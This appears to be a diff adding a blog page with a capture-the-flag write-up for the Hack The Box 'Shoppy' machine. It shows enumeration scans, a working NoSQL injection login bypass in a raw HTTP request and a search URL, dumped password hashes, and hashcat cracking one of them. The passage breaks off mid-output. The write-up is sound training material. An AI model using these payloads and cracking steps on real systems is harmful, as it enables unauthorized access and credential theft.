@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<link rel="shortcut icon" href="https://jordangalida.github.io/images/ability_poisons.jpg" />
+<title>HTB Shoppy Write-up | Jordan&#39;s Blog</title>
+<meta name="title" content="HTB Shoppy Write-up" />
+<meta name="description" content="A write-up for the Shoppy box." />
+<meta name="keywords" content="HTB,Pentesting," />
+
+
+<meta property="og:url" content="https://jordangalida.github.io/htb-shoppy-write-up/">
+  <meta property="og:site_name" content="Jordan&#39;s Blog">
+  <meta property="og:title" content="HTB Shoppy Write-up">
+  <meta property="og:description" content="A write-up for the Shoppy box.">
+  <meta property="og:locale" content="en_US">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2025-02-24T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-02-24T00:00:00+00:00">
+    <meta property="article:tag" content="HTB">
+    <meta property="article:tag" content="Pentesting">
+    <meta property="og:image" content="https://jordangalida.github.io/images/share.png">
+
+
+
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://jordangalida.github.io/images/share.png">
+  <meta name="twitter:title" content="HTB Shoppy Write-up">
+  <meta name="twitter:description" content="A write-up for the Shoppy box.">
+
+
+
+
+  <meta itemprop="name" content="HTB Shoppy Write-up">
+  <meta itemprop="description" content="A write-up for the Shoppy box.">
+  <meta itemprop="datePublished" content="2025-02-24T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-02-24T00:00:00+00:00">
+  <meta itemprop="wordCount" content="1682">
+  <meta itemprop="image" content="https://jordangalida.github.io/images/share.png">
+  <meta itemprop="keywords" content="HTB,Pentesting">
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+  <style>
+  :root {
+      --width: 800px;
+      --font-main: "Courier New", monospace;
+      --font-secondary: "Courier New", monospace;
+      --font-scale: 1em;
+      --background-color: #fff;
+      --heading-color: #222;
+      --text-color: #444;
+      --link-color: #32ab60;
+      --visited-color:  #32ab60;
+      --code-background-color: #f2f2f2;
+      --code-color: #222;
+      --blockquote-color: #222;
+      --overflow-wrap: break-word;
+  }
+
+  @media (prefers-color-scheme: dark) {
+      :root {
+          --background-color: #070b0a;
+          --heading-color: #32ab60;
+          --text-color: #32ab60;
+          --link-color: #32ab60;
+          --visited-color:  #32ab60;
+          --code-background-color: #272822;
+          --code-color: #ddd;
+          --blockquote-color: #ccc;
+      }
+  }
+
+  body {
+      font-family: var(--font-secondary);
+      font-size: var(--font-scale);
+      margin: auto;
+      padding: 20px;
+      max-width: var(--width);
+      text-align: left;
+      background-color: var(--background-color);
+      word-wrap: break-word;
+      overflow-wrap: break-word;
+      white-space: normal;
+      line-height: 1.5;
+      color: var(--text-color);
+  }
+
+  h1, h2, h3, h4, h5, h6 {
+      font-family: var(--font-main);
+      color: var(--heading-color);
+  }
+
+  a {
+      color: var(--link-color);
+      cursor: pointer;
+      text-decoration: none;
+  }
+
+  a:hover {
+      text-decoration: underline; 
+  }
+
+  nav a {
+      margin-right: 8px;
+  }
+
+  strong, b {
+      color: var(--heading-color);
+  }
+
+  button {
+      margin: 0;
+      cursor: pointer;
+  }
+
+  main {
+      line-height: 1.6;
+  }
+
+  table {
+      width: 100%;
+  }
+
+  hr {
+      border: 0;
+      border-top: 1px dashed;
+  }
+
+  img {
+      max-width: 100%;
+  }
+
+  pre {
+      white-space: pre-wrap !important;
+      overflow-x: auto !important;
+      word-break: break-all !important;
+      max-width: var(--width) !important;
+      margin: 0 !important;
+  }
+
+  code {
+      font-family: "Courier New", monospace;
+      background-color: var(--code-background-color);
+      color: var(--code-color);
+      white-space: pre-wrap;
+      word-wrap: break-word;
+      overflow-wrap: anywhere;
+  }
+
+  blockquote {
+      border-left: 1px solid #999;
+      color: var(--code-color);
+      padding-left: 20px;
+      font-style: italic;
+      text-wrap: wrap;
+  }
+
+  footer {
+      padding: 25px 0;
+      text-align: center;
+  }
+
+  .title:hover {
+      text-decoration: none;
+  }
+
+  .title h1 {
+      font-size: 1.5em;
+  }
+
+  .inline {
+      width: auto !important;
+  }
+
+  .highlight, .code {
+      background-color: var(--code-background-color);
+      color: var(--code-color);
+      padding: 5px 10px;
+      word-break: normal;
+      white-space: pre-wrap; 
+      overflow-wrap: anywhere;
+      overflow-x: auto;
+  }
+
+   
+  ul.blog-posts {
+      list-style-type: none;
+      padding: unset;
+  }
+
+  ul.blog-posts li {
+      display: flex;
+  }
+
+  ul.blog-posts li span {
+      flex: 0 0 130px;
+  }
+
+  ul.blog-posts li a:visited {
+      color: var(--visited-color);
+</style>
+
+</head>
+
+<body>
+  <header><a href="/" class="title">
+  <h2>Jordan&#39;s Blog</h2>
+</a>
+<nav><a href="/">Home</a>
+
+
+<a href="/blog">Blog</a>
+
+</nav>
+</header>
+  <main>
+
+<h1>HTB Shoppy Write-up</h1>
+<p>
+  <i>
+    <time datetime='2025-02-24'>
+      24 Feb, 2025
+    </time>
+  </i>
+</p>
+
+<content>
+  <p>Shoppy starts off with discovering a simple website that shows a countdown until launch. Upon further enumeration, we find a login portal which is vulnerable to NoSQL injection due to the application running on NodeJS. We use this vulnerability to obtain credentials for a user. After performing subdomain enumeration with a bunch of different wordlists, we find the <code>mattermost</code> subdomain. We then are able to use the credentials we discovered earlier to log in and find a chat with cleartext credentials for a user on the host. After we SSH into the box, we find that we have <code>sudo</code> permissions to run a home-grown password-manager application which requests a master password. By running <code>strings</code> with different encodings, we find the master password and the password-manager application gives us credentials for another user. The new user is a member of the <code>docker</code> group which allows us to spin up a container and mount the entire host file system giving us access to the <code>root</code> user&rsquo;s directory and the final flag.</p>
+<hr>
+<p>We start off with an <code>nmap</code> scan on all ports with version detection and scripts enabled</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo nmap -sV -sC -p- 10.10.11.180 -oA shoppy_all
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-24 14:26 EST
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.11.180
+</span></span><span style="display:flex;"><span>Host is up (0.017s latency).
+</span></span><span style="display:flex;"><span>Not shown: 65532 closed tcp ports (reset)
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE  VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)
+</span></span><span style="display:flex;"><span>|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)
+</span></span><span style="display:flex;"><span>|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)
+</span></span><span style="display:flex;"><span>80/tcp   open  http     nginx 1.23.1
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://shoppy.htb
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.23.1
+</span></span><span style="display:flex;"><span>9093/tcp open  copycat?
+</span></span><span style="display:flex;"><span>| fingerprint-strings:
+</span></span><span style="display:flex;"><span>|   GenericLines:
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 400 Bad Request
+</span></span><span style="display:flex;"><span>|     Content-Type: text/plain; charset=utf-8
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|     Request
+</span></span><span style="display:flex;"><span>|   GetRequest, HTTPOptions:
+</span></span><span style="display:flex;"><span>|     HTTP/1.0 200 OK
+</span></span><span style="display:flex;"><span>|     Content-Type: text/plain; version=0.0.4; charset=utf-8
+</span></span><span style="display:flex;"><span>|     Date: Mon, 24 Feb 2025 19:27:43 GMT
+</span></span><span style="display:flex;"><span>|     HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.
+</span></span><span style="display:flex;"><span>|     TYPE go_gc_cycles_automatic_gc_cycles_total counter
+</span></span><span style="display:flex;"><span>|     go_gc_cycles_automatic_gc_cycles_total 27
+</span></span><span style="display:flex;"><span>|     HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.
+</span></span><span style="display:flex;"><span>|     TYPE go_gc_cycles_forced_gc_cycles_total counter
+</span></span><span style="display:flex;"><span>|     go_gc_cycles_forced_gc_cycles_total 0
+</span></span><span style="display:flex;"><span>|     HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.
+</span></span><span style="display:flex;"><span>|     TYPE go_gc_cycles_total_gc_cycles_total counter
+</span></span><span style="display:flex;"><span>|     go_gc_cycles_total_gc_cycles_total 27
+</span></span><span style="display:flex;"><span>|     HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.
+</span></span><span style="display:flex;"><span>|     TYPE go_gc_duration_seconds summary
+</span></span><span style="display:flex;"><span>|     go_gc_duration_seconds{quantile=&#34;0&#34;} 1.8065e-05
+</span></span><span style="display:flex;"><span>|     go_gc_duration_seconds{quantile=&#34;0.25&#34;} 5.4011e-05
+</span></span><span style="display:flex;"><span>|_    go_gc_d
+</span></span><span style="display:flex;"><span>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span>SF-Port9093-TCP:V=7.94SVN%I=7%D=2/24%Time=67BCC82F%P=x86_64-pc-linux-gnu%r
+</span></span><span style="display:flex;"><span>SF:(GenericLines,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
+</span></span><span style="display:flex;"><span>SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
+</span></span><span style="display:flex;"><span>SF:d\x20Request&#34;)%r(GetRequest,2A60,&#34;HTTP/1\.0\x20200\x20OK\r\nContent-Typ
+</span></span><span style="display:flex;"><span>SF:e:\x20text/plain;\x20version=0\.0\.4;\x20charset=utf-8\r\nDate:\x20Mon,
+</span></span><span style="display:flex;"><span>SF:\x2024\x20Feb\x202025\x2019:27:43\x20GMT\r\n\r\n#\x20HELP\x20go_gc_cycl
+</span></span><span style="display:flex;"><span>SF:es_automatic_gc_cycles_total\x20Count\x20of\x20completed\x20GC\x20cycle
+</span></span><span style="display:flex;"><span>SF:s\x20generated\x20by\x20the\x20Go\x20runtime\.\n#\x20TYPE\x20go_gc_cycl
+</span></span><span style="display:flex;"><span>SF:es_automatic_gc_cycles_total\x20counter\ngo_gc_cycles_automatic_gc_cycl
+</span></span><span style="display:flex;"><span>SF:es_total\x2027\n#\x20HELP\x20go_gc_cycles_forced_gc_cycles_total\x20Cou
+</span></span><span style="display:flex;"><span>SF:nt\x20of\x20completed\x20GC\x20cycles\x20forced\x20by\x20the\x20applica
+</span></span><span style="display:flex;"><span>SF:tion\.\n#\x20TYPE\x20go_gc_cycles_forced_gc_cycles_total\x20counter\ngo
+</span></span><span style="display:flex;"><span>SF:_gc_cycles_forced_gc_cycles_total\x200\n#\x20HELP\x20go_gc_cycles_total
+</span></span><span style="display:flex;"><span>SF:_gc_cycles_total\x20Count\x20of\x20all\x20completed\x20GC\x20cycles\.\n
+</span></span><span style="display:flex;"><span>SF:#\x20TYPE\x20go_gc_cycles_total_gc_cycles_total\x20counter\ngo_gc_cycle
+</span></span><span style="display:flex;"><span>SF:s_total_gc_cycles_total\x2027\n#\x20HELP\x20go_gc_duration_seconds\x20A
+</span></span><span style="display:flex;"><span>SF:\x20summary\x20of\x20the\x20pause\x20duration\x20of\x20garbage\x20colle
+</span></span><span style="display:flex;"><span>SF:ction\x20cycles\.\n#\x20TYPE\x20go_gc_duration_seconds\x20summary\ngo_g
+</span></span><span style="display:flex;"><span>SF:c_duration_seconds{quantile=\&#34;0\&#34;}\x201\.8065e-05\ngo_gc_duration_secon
+</span></span><span style="display:flex;"><span>SF:ds{quantile=\&#34;0\.25\&#34;}\x205\.4011e-05\ngo_gc_d&#34;)%r(HTTPOptions,24C0,&#34;HT
+</span></span><span style="display:flex;"><span>SF:TP/1\.0\x20200\x20OK\r\nContent-Type:\x20text/plain;\x20version=0\.0\.4
+</span></span><span style="display:flex;"><span>SF:;\x20charset=utf-8\r\nDate:\x20Mon,\x2024\x20Feb\x202025\x2019:27:43\x2
+</span></span><span style="display:flex;"><span>SF:0GMT\r\n\r\n#\x20HELP\x20go_gc_cycles_automatic_gc_cycles_total\x20Coun
+</span></span><span style="display:flex;"><span>SF:t\x20of\x20completed\x20GC\x20cycles\x20generated\x20by\x20the\x20Go\x2
+</span></span><span style="display:flex;"><span>SF:0runtime\.\n#\x20TYPE\x20go_gc_cycles_automatic_gc_cycles_total\x20coun
+</span></span><span style="display:flex;"><span>SF:ter\ngo_gc_cycles_automatic_gc_cycles_total\x2027\n#\x20HELP\x20go_gc_c
+</span></span><span style="display:flex;"><span>SF:ycles_forced_gc_cycles_total\x20Count\x20of\x20completed\x20GC\x20cycle
+</span></span><span style="display:flex;"><span>SF:s\x20forced\x20by\x20the\x20application\.\n#\x20TYPE\x20go_gc_cycles_fo
+</span></span><span style="display:flex;"><span>SF:rced_gc_cycles_total\x20counter\ngo_gc_cycles_forced_gc_cycles_total\x2
+</span></span><span style="display:flex;"><span>SF:00\n#\x20HELP\x20go_gc_cycles_total_gc_cycles_total\x20Count\x20of\x20a
+</span></span><span style="display:flex;"><span>SF:ll\x20completed\x20GC\x20cycles\.\n#\x20TYPE\x20go_gc_cycles_total_gc_c
+</span></span><span style="display:flex;"><span>SF:ycles_total\x20counter\ngo_gc_cycles_total_gc_cycles_total\x2027\n#\x20
+</span></span><span style="display:flex;"><span>SF:HELP\x20go_gc_duration_seconds\x20A\x20summary\x20of\x20the\x20pause\x2
+</span></span><span style="display:flex;"><span>SF:0duration\x20of\x20garbage\x20collection\x20cycles\.\n#\x20TYPE\x20go_g
+</span></span><span style="display:flex;"><span>SF:c_duration_seconds\x20summary\ngo_gc_duration_seconds{quantile=\&#34;0\&#34;}\x
+</span></span><span style="display:flex;"><span>SF:201\.8065e-05\ngo_gc_duration_seconds{quantile=\&#34;0\.25\&#34;}\x205\.4011e-0
+</span></span><span style="display:flex;"><span>SF:5\ngo_gc_d&#34;);
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>Looks like port 80 is open and <code>nmap</code> has detected that the domain name is <code>shoppy.htb</code>. We will add that to our <code>/etc/hosts</code>. However, we also see port 9093 open which looks like another website. Let&rsquo;s start out with port 80
+<img src="/images/Shoppy/site.png" alt="Website"></p>
+<p>Looks like a it is just a countdown until the site is fully launched. Let&rsquo;s do some directory fuzzing and in the meantime, look at port 9093. It looks like some kind of log?
+<img src="/images/Shoppy/9093.png" alt="Website"></p>
+<p>Meanwhile, our directory fuzzing finished</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$gobuster dir -u http://shoppy.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x .php -t <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>Gobuster v3.6
+</span></span><span style="display:flex;"><span>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>[+] Url:                     http://shoppy.htb
+</span></span><span style="display:flex;"><span>[+] Method:                  GET
+</span></span><span style="display:flex;"><span>[+] Threads:                 300
+</span></span><span style="display:flex;"><span>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+</span></span><span style="display:flex;"><span>[+] Negative Status codes:   404
+</span></span><span style="display:flex;"><span>[+] User Agent:              gobuster/3.6
+</span></span><span style="display:flex;"><span>[+] Extensions:              php
+</span></span><span style="display:flex;"><span>[+] Timeout:                 10s
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>/images               (Status: 301) [Size: 179] [--&gt; /images/]
+</span></span><span style="display:flex;"><span>/login                (Status: 200) [Size: 1074]
+</span></span><span style="display:flex;"><span>/admin                (Status: 302) [Size: 28] [--&gt; /login]
+</span></span><span style="display:flex;"><span>/assets               (Status: 301) [Size: 179] [--&gt; /assets/]
+</span></span><span style="display:flex;"><span>/css                  (Status: 301) [Size: 173] [--&gt; /css/]
+</span></span><span style="display:flex;"><span>/Login                (Status: 200) [Size: 1074]
+</span></span><span style="display:flex;"><span>/js                   (Status: 301) [Size: 171] [--&gt; /js/]
+</span></span><span style="display:flex;"><span>/fonts                (Status: 301) [Size: 177] [--&gt; /fonts/]
+</span></span><span style="display:flex;"><span>/Admin                (Status: 302) [Size: 28] [--&gt; /login]
+</span></span><span style="display:flex;"><span>/exports              (Status: 301) [Size: 181] [--&gt; /exports/]
+</span></span><span style="display:flex;"><span>Progress: 175328 / 175330 (100.00%)
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span><span style="display:flex;"><span>Finished
+</span></span><span style="display:flex;"><span>===============================================================
+</span></span></code></pre></div><p>The admin directory is interesting, looks like we found a login portal
+<img src="/images/Shoppy/admin.png" alt="Website"></p>
+<p>We try a few weak credentials, but don&rsquo;t find anything. Let&rsquo;s try to fuzz vhosts</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://shoppy.htb/ -H <span style="color:#e6db74">&#39;Host: FUZZ.shoppy.htb&#39;</span> -fs <span style="color:#ae81ff">169</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>        /&#39;___\  /&#39;___\           /&#39;___\
+</span></span><span style="display:flex;"><span>       /\ \__/ /\ \__/  __  __  /\ \__/
+</span></span><span style="display:flex;"><span>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+</span></span><span style="display:flex;"><span>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+</span></span><span style="display:flex;"><span>         \ \_\   \ \_\  \ \____/  \ \_\
+</span></span><span style="display:flex;"><span>          \/_/    \/_/   \/___/    \/_/
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>       v2.1.0-dev
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span> :: Method           : GET
+</span></span><span style="display:flex;"><span> :: URL              : http://shoppy.htb/
+</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
+</span></span><span style="display:flex;"><span> :: Header           : Host: FUZZ.shoppy.htb
+</span></span><span style="display:flex;"><span> :: Follow redirects : false
+</span></span><span style="display:flex;"><span> :: Calibration      : false
+</span></span><span style="display:flex;"><span> :: Timeout          : 10
+</span></span><span style="display:flex;"><span> :: Threads          : 40
+</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+</span></span><span style="display:flex;"><span> :: Filter           : Response size: 169
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>mattermost              [Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 62ms]
+</span></span><span style="display:flex;"><span>:: Progress: [100000/100000] :: Job [1/1] :: 419 req/sec :: Duration: [0:01:20] :: Errors: 0 ::
+</span></span></code></pre></div><p>We add it to our <code>/etc/hosts</code> and navigate to the page
+<img src="/images/Shoppy/mattermost.png" alt="Website"></p>
+<p>Going back to the original Shoppy website, if we enter a directory that doesn&rsquo;t exist, we will get this error:
+<img src="/images/Shoppy/nodejs.png" alt="Website"></p>
+<p>This lets us know that this is NodeJS. This is important because the backend will probably not be MySQL. It will probably be MongoDB, which is NoSQL, so any SQL injection login bypasses we attempt will fail. Let&rsquo;s go back to the login portal and try some common NoSQL injections. After a few attempts with common injections, one finally worked</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTTP" data-lang="HTTP"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /login?error=WrongCredentials <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">shoppy.htb</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate, br</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">39</span>
+</span></span><span style="display:flex;"><span>Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://shoppy.htb</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
+</span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://shoppy.htb/login?error=WrongCredentials</span>
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">rl_user_id=RudderEncrypt%3AU2FsdGVkX19M5bAgvW52SeqMPu%2FlnNoywVvLpbSe1dqllRD5H%2FYJ%2BtTeosW1B5eA; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX181WqpaX%2BTOV5Bz9uzslS8Hjt%2Bbqj%2Flh44LUo0Z3wOaxHo7YcwcHJLcHzXqv%2FrT3K0LtxKJVenERA%3D%3D; rl_group_id=RudderEncrypt%3AU2FsdGVkX19Tgo41vt2Zo4DHSovPJv4y%2B5C1lQSp6hA%3D; rl_trait=RudderEncrypt%3AU2FsdGVkX1%2Bsb2D%2FaMOqywcFFrRYvY3RG3eNhXE3FNY%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX1%2FLcYVeyGfaDeGgZJjkgFRdvGHKwmyTH7c%3D</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Priority<span style="color:#f92672">:</span> <span style="color:#ae81ff">u=0, i</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>username=admin&#39;||&#39;1&#39;==&#39;1&amp;password=admin
+</span></span></code></pre></div><p>Which resulted in being redirected to the admin page</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTTP" data-lang="HTTP"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">302</span> <span style="color:#a6e22e">Found</span>
+</span></span><span style="display:flex;"><span>Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">nginx/1.23.1</span>
+</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Tue, 04 Mar 2025 15:57:50 GMT</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html; charset=utf-8</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">56</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
+</span></span><span style="display:flex;"><span>Location<span style="color:#f92672">:</span> <span style="color:#ae81ff">/admin</span>
+</span></span><span style="display:flex;"><span>Vary<span style="color:#f92672">:</span> <span style="color:#ae81ff">Accept</span>
+</span></span><span style="display:flex;"><span>Set-Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">connect.sid=s%3A2oewPo39g6XcL6pNA8m13_UtZrTuW98D.5pBPF1NDnBiYBrt%2FDm6ftFEYRM5S3JXGhGh7fpLdwuY; Path=/; HttpOnly</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">p</span>&gt;Found. Redirecting to &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/admin&#34;</span>&gt;/admin&lt;/<span style="color:#f92672">a</span>&gt;&lt;/<span style="color:#f92672">p</span>&gt;
+</span></span></code></pre></div><p>Finally, we are in the Shoppy app as the admin
+<img src="/images/Shoppy/nosql.png" alt="Website"></p>
+<p>There&rsquo;s a function to search for users. The first thing to try to to not put anything in the search field and see if it will return all, but that doesn&rsquo;t work. However, we can use the same NoSQL injection with the search field - look at the URL when we search for a user <code>hacker</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTTP" data-lang="HTTP"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">http://shoppy.htb/admin/search-users?username=hacker
+</span></span></span></code></pre></div><p>Let&rsquo;s use the same logic as before:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTTP" data-lang="HTTP"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">http://shoppy.htb/admin/search-users?username=hacker&#39;||&#39;1&#39;==&#39;1
+</span></span></span></code></pre></div><p>Now we see a <code>Download export</code> button
+<img src="/images/Shoppy/download.png" alt="Website"></p>
+<p>Which displays the usernames and password hashes in JSON format</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>[{<span style="color:#f92672">&#34;_id&#34;</span>:<span style="color:#e6db74">&#34;62db0e93d6d6a999a66ee67a&#34;</span>,<span style="color:#f92672">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;admin&#34;</span>,<span style="color:#f92672">&#34;password&#34;</span>:<span style="color:#e6db74">&#34;23c6877d9e2b564ef8b32c3a23de27b2&#34;</span>},{<span style="color:#f92672">&#34;_id&#34;</span>:<span style="color:#e6db74">&#34;62db0e93d6d6a999a66ee67b&#34;</span>,<span style="color:#f92672">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;josh&#34;</span>,<span style="color:#f92672">&#34;password&#34;</span>:<span style="color:#e6db74">&#34;6ebcea65320589ca4f2f1ce039975995&#34;</span>}]
+</span></span></code></pre></div><p>Maybe this Josh user is an actual user on the host? Let&rsquo;s try to crack the hashes</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$hashcat -m <span style="color:#ae81ff">0</span> hash /usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>hashcat (v6.2.6) starting
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt;
+</span></span><span style="display:flex;"><span>6ebcea65320589ca4f2f1ce039975995:remembermethisway
+</span></span><span style="display:flex;"><span>Approaching final keyspace - workload adjusted.
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Session..........: hashcat
+</span></span><span style="display:flex;"><span>Status...........: Exhausted
+</span></span><span style="display:flex;"><span>Hash.Mode........: 0 (MD5)
+</span></span><span style="display:flex;"><span>Hash.Target......: hash
+</span></span><span style="display:flex;"><span>Time.Started.....: Tue Mar  4 11:09:21 2025 (3 secs)
+</span></span><span style="display:flex;"><span>Time.Estimated...: Tue Mar  4 11:09:24 2025 (0 secs)
+</span></span><span style="display:flex;"><span>Kernel.Feature...: Pure Kernel
